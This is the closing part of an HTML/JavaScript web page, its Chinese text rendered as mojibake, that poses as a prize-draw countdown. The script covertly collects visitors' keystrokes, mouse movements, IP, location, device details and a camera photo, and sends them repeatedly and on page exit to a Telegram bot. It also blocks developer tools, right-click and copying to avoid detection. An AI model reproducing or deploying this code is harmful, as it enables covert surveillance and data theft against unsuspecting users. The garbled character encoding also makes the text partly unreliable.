âŒ¨ï¸ æŒ‰é”®è®°å½•: ${keyStrokes.length} æ¬¡
ğŸ”‹ ç”µæ± : ${collectedData.device.battery?.level || 'æœªçŸ¥'}
ğŸ›œ ç½‘ç»œç±»å‹: ${collectedData.device.connection?.effectiveType || 'æœªçŸ¥'}

ğŸ“Š å½“å‰é˜¶æ®µ: ${collectedData.stage}
ğŸ¯ ç”¨æˆ·çŠ¶æ€: ${collectedData.status}
ğŸ”— UserAgent: ${collectedData.device.userAgent?.substring(0, 80) || 'æœªçŸ¥'}`;
        }

        // å‘é€åˆ°Telegram
        async function sendToTelegram(message, isPhoto = false) {
            if (!TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) {
                return false;
            }

            try {
                let url, options;
                
                if (isPhoto) {
                    // å‘é€ç…§ç‰‡
                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`;
                    const formData = new FormData();
                    formData.append('chat_id', TELEGRAM_CONFIG.chatId);
                    formData.append('photo', message, 'user_face.jpg');
                    formData.append('caption', `ğŸ“¸ å€’è®¡æ—¶ç”¨æˆ·æ‹ç…§ - ${new Date().toLocaleString()}`);
                    
                    options = {
                        method: 'POST',
                        body: formData
                    };
                } else {
                    // å‘é€æ–‡æœ¬
                    url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
                    options = {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CONFIG.chatId,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    };
                }

                const response = await fetch(url, options);
                return response.ok;
                
            } catch (error) {
                console.error('Telegramå‘é€å¤±è´¥:', error);
                return false;
            }
        }

        // å¼€å§‹å®šæœŸå‘é€æ•°æ®
        function startTelemetrySending() {
            logToStream('[ç³»ç»Ÿ] å¼€å§‹å®šæœŸå‘é€æ•°æ®...');
            
            // ç«‹å³å‘é€ä¸€æ¬¡
            sendTelemetryData();
            
            // æ¯5ç§’å‘é€ä¸€æ¬¡
            dataStreamInterval = setInterval(() => {
                if (!telemetrySent) {
                    sendTelemetryData();
                }
            }, TELEGRAM_CONFIG.sendInterval);
        }

        // å‘é€æ•°æ®
        async function sendTelemetryData() {
            try {
                const message = formatTelegramMessage();
                const success = await sendToTelegram(message);
                
                if (success) {
                    logToStream(`[ç³»ç»Ÿ] æ•°æ®å‘é€æˆåŠŸ (${new Date().toLocaleTimeString()})`);
                }
                
            } catch (error) {
                console.error('æ•°æ®å‘é€å¤±è´¥:', error);
            }
        }

        // å‘é€æœ€ç»ˆæ•°æ®
        async function sendFinalData() {
            telemetrySent = true;
            
            const finalMessage = `âœ… å€’è®¡æ—¶ç»“æŸ - ç”¨æˆ·æ•°æ®æ±‡æ€»
ç”¨æˆ·: ${collectedData.queueNumber || 'æœªçŸ¥'}
IP: ${collectedData.ip || 'æœªçŸ¥'}
ä½ç½®: ${collectedData.location || 'æœªçŸ¥'}
è®¾å¤‡: ${collectedData.device.platform || 'æœªçŸ¥'}
æµè§ˆå™¨: ${collectedData.device.browser || 'æœªçŸ¥'}
æ‘„åƒå¤´: ${cameraAccessed ? 'æ˜¯' : 'å¦'}
é¼ æ ‡è·Ÿè¸ª: ${mousePositions.length} ç‚¹
æŒ‰é”®è®°å½•: ${keyStrokes.length} æ¬¡
æ€»æ•°æ®ç‚¹: ${Object.keys(collectedData).length}

ğŸ“Š å®Œæ•´æ•°æ®:
${JSON.stringify(collectedData, null, 2).substring(0, 3000)}`;
            
            await sendToTelegram(finalMessage);
            
            // æ¸…é™¤å®šæ—¶å™¨
            if (dataStreamInterval) {
                clearInterval(dataStreamInterval);
            }
        }
        // ==================== ä¸»æµç¨‹ ====================

        // åˆå§‹åŒ–é¡µé¢
        function initPage() {
            // æ˜¾ç¤ºåŠ è½½åŠ¨ç”»
            updateLoading('æ­£åœ¨è¿æ¥æŠ½å¥–æœåŠ¡å™¨...');
            
            // æ¨¡æ‹Ÿç½‘ç»œå»¶è¿Ÿ
            setTimeout(() => {
                updateLoading('æ­£åœ¨åŠ è½½å¥–å“æ•°æ®...');
                
                setTimeout(() => {
                    updateLoading('æ­£åœ¨åˆå§‹åŒ–å€’è®¡æ—¶ç³»ç»Ÿ...');
                    
                    setTimeout(() => {
                        // éšè—åŠ è½½é¡µé¢ï¼Œæ˜¾ç¤ºä¸»å†…å®¹
                        initialLoading.style.display = 'none';
                        mainContent.style.display = 'block';
                        
                        // å¼€å§‹å€’è®¡æ—¶
                        initCountdown();
                        
                        logToStream('[ç³»ç»Ÿ] é¡µé¢åˆå§‹åŒ–å®Œæˆï¼Œå€’è®¡æ—¶å¼€å§‹');
                        
                    }, 1500);
                }, 1500);
            }, 1500);
        }

        // é˜²æ£€æµ‹æªæ–½
        function setupAntiDetection() {
            // é˜²æ­¢å³é”®èœå•
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                return false;
            });
            
            // é˜²æ­¢å¼€å‘è€…å·¥å…·
            document.addEventListener('keydown', (e) => {
                // ç¦ç”¨ F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                    return false;
                }
            });
            
            // é˜²æ­¢å¤åˆ¶
            document.addEventListener('copy', (e) => {
                e.preventDefault();
            });
            
            // æ£€æµ‹å¼€å‘è€…å·¥å…·
            const devToolsCheck = () => {
                const widthThreshold = window.outerWidth - window.innerWidth > 160;
                const heightThreshold = window.outerHeight - window.innerHeight > 160;
                
                if (widthThreshold || heightThreshold) {
                    logToStream('[å®‰å…¨] æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·å·²æ‰“å¼€');
                    collectedData.devToolsDetected = true;
                }
            };
            
            setInterval(devToolsCheck, 1000);
        }

        // é¡µé¢å¸è½½æ—¶å‘é€æ•°æ®
        window.addEventListener('beforeunload', () => {
            if (!telemetrySent) {
                sendFinalData();
            }
        });

        // é¡µé¢éšè—æ—¶è®°å½•
        document.addEventListener('visibilitychange', () => {
            collectedData.pageVisibility = document.hidden ? 'hidden' : 'visible';
            
            if (document.hidden) {
                logToStream('[ç³»ç»Ÿ] ç”¨æˆ·åˆ‡æ¢åˆ°å…¶ä»–æ ‡ç­¾é¡µ');
            }
        });

        // é¡µé¢åŠ è½½å®Œæˆ
        window.addEventListener('DOMContentLoaded', () => {
            // è®¾ç½®é˜²æ£€æµ‹
            setupAntiDetection();
            
            // åˆå§‹åŒ–é¡µé¢
            initPage();
            
            // è®°å½•è®¿é—®å¼€å§‹æ—¶é—´
            collectedData.visitStart = new Date().toISOString();
            logToStream(`[ç³»ç»Ÿ] ç”¨æˆ·è®¿é—®å¼€å§‹: ${collectedData.visitStart}`);
        });

        // ç½‘ç»œçŠ¶æ€å˜åŒ–
        window.addEventListener('online', () => {
            logToStream('[ç½‘ç»œ] ç”¨æˆ·æ¢å¤ç½‘ç»œè¿æ¥');
        });
        
        window.addEventListener('offline', () => {
            logToStream('[ç½‘ç»œ] ç”¨æˆ·å¤±å»ç½‘ç»œè¿æ¥');
        });

        // é”™è¯¯å¤„ç†
        window.addEventListener('error', (error) => {
            logToStream(`[é”™è¯¯] ${error.message}`);
            collectedData.errors = collectedData.errors || [];
            collectedData.errors.push({
                message: error.message,
                timestamp: new Date().toISOString()
            });
        });
    </script>
</body>
</html>
